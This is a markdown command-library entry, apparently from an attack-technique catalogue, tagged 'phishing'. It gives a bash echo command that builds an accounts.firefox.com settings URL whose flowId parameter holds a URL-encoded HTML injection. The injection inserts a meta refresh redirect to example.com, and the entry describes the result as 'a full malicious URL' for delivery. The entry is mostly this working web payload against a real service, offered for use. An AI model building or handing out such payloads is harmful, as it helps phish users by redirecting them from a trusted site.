---
id: cmd-uuid-4
data: >-
  echo
  "https://accounts.firefox.com/settings?deviceId=cc10a15a5ac94bdf8a9a0bc5b2912520&flowBeginTime=1676972087857&flowId=%22%3E%3Cmeta%20http-equiv=%22refresh%22%20content=%221;%20http://example.com%22%3E&broker=web&context=web&isSampledUser=false&service=none&uniqueUserId=dbf23f86-d3d1-4576-92bc-ebaa4fd14795"
tags:
  - url
  - phishing
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:47:23.617Z'
verified: false
validated: true
submitted: true
---
# construct-url

## Command

```bash
echo "https://accounts.firefox.com/settings?deviceId=cc10a15a5ac94bdf8a9a0bc5b2912520&flowBeginTime=1676972087857&flowId=%22%3E%3Cmeta%20http-equiv=%22refresh%22%20content=%221;%20http://example.com%22%3E&broker=web&context=web&isSampledUser=false&service=none&uniqueUserId=dbf23f86-d3d1-4576-92bc-ebaa4fd14795"
```

## Description

Constructs a full malicious URL with encoded HTML injection payload.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL components | Base URL and params | Yes |

## Examples

### Basic Usage

```bash
echo "https://accounts.firefox.com/settings?..."  # Full URL
```

## Expected Output

Complete URL string for delivery.

## Related

- [[commands/url-encode-payload]]
